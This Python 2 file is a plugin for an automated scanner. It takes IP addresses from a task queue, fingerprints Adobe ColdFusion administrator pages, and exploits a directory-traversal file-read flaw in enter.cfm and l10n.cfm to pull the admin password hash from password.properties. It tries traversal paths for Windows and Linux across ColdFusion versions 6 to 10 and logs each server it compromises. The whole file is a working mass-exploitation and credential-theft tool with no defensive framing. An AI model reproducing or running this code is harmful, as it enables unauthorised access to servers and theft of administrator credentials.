from task import *
import socket, struct, time
import requests, re

conn_timeout = 4
headers = {'Content-type': "application/x-www-form-urlencoded",
           'Accept': "text/plain",
           'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1'}

def request_cf_file(protocal, host, filename, ver):
    if ver and ver >=9:
        vul_url = "%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=%s&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
    else:
        vul_url = "%s://%s/CFIDE/administrator/enter.cfm?locale=%s"
        
    try:
        url = vul_url % (protocal, host, filename)
        if not ver or ver < 9:
            url += '%00en'

        response = requests.get(url, headers=headers, timeout=conn_timeout)
        return response.text
    except:
        pass
    return None

def detect_cf_pwd(host):    
    protocals = ("http", "https")
    pwd_path_list = (("win", 9, "ColdFusion9\lib\password.properties"),
                     ("win", 9, "ColdFusion9\cfusion\lib\password.properties"),
                     ("win", 10, "ColdFusion10\lib\password.properties"),
                     ("win", 10, "ColdFusion10\cfusion\lib\password.properties"),
                     ("lnx", 9, "opt/coldfusion9/lib/password.properties"),
                     ("lnx", 9, "opt/coldfusion9/cfusion/lib/password.properties"),
                     ("lnx", 10, "opt/coldfusion10/lib/password.properties"),
                     ("lnx", 10, "opt/coldfusion10/cfusion/lib/password.properties"),
                     ("lnx", None, "opt/coldfusion/cfusion/lib/password.properties"),
                     (None, None, "..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"),
                     (None, 8, "ColdFusion8\lib\password.properties"),
                     (None, 7, "CFusionMX7\lib\password.properties"),
                     (None, 6, "CFusionMX\lib\password.properties"))
    
    trav = "../../../../../../../../../"
    
    cf_srv_info = None
    
    for protocal in protocals:
        try:
            url = "%s://%s/CFIDE/administrator/index.cfm" % (protocal, host)
            response = requests.get(url, allow_redirects=False, headers=headers, timeout=conn_timeout)
            
            http_headers = response.headers
            
            server_info = http_headers.get('server')
            page = response.text
            
            if "1995-2009 Adobe Systems" in page or "1995-2010 Adobe Systems" in page:
                ver = 9
            elif "1997-2012 Adobe Systems" in page:
                ver = 10
            elif "1995-2006 Adobe" in page:
                ver = 8
            else:
                ver = None
            
            if "IIS" in server_info or "Windows" in server_info:
                os = "win"
            elif "Apache/" in server_info:
                os = "lnx"
            else:
                os = None

            cf_srv_info = (url, ver, server_info)

            if response.status_code != 200 or not "ColdFusion Administrator Login" in page:
                continue
                
            for _os, _ver, _path in pwd_path_list:
                if _os == os or not os or not _os:
                    if _ver == ver or not ver or not _ver:
                        trav_path = trav + _path
                        if _os == 'win' or os == 'win':
                            trav_path = trav_path.replace('/', '\\')
                            
                        if not _ver:
                            _ver = ver
                            
                        response = request_cf_file(protocal, host, trav_path, _ver)
                        if response:                            
                            match = re.search("password\s*=\s*(\w+)\s", response)
                            if match:
                                return (cf_srv_info, match.group(1))
        except:
            pass
    
    if cf_srv_info:
        return (cf_srv_info, None)
    
    return None

class cf_plugin(engine_plugin):
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        #self.max_process = 20
        
    def handle_task(self, task_info):
        ip =  socket.inet_ntoa(struct.pack("L", socket.htonl(task_info['work'])))
        print "handle_task: %s\r" % ip,
        cf_info = detect_cf_pwd(ip)
        if cf_info:
            (url, ver, server_info), pass_hash = cf_info
            print "%s SUCCESS" % url
            self.log(task_info, "%s\t%s\t%s" % (url, server_info, pass_hash))
            
def init_plugin(name):
    return cf_plugin(name)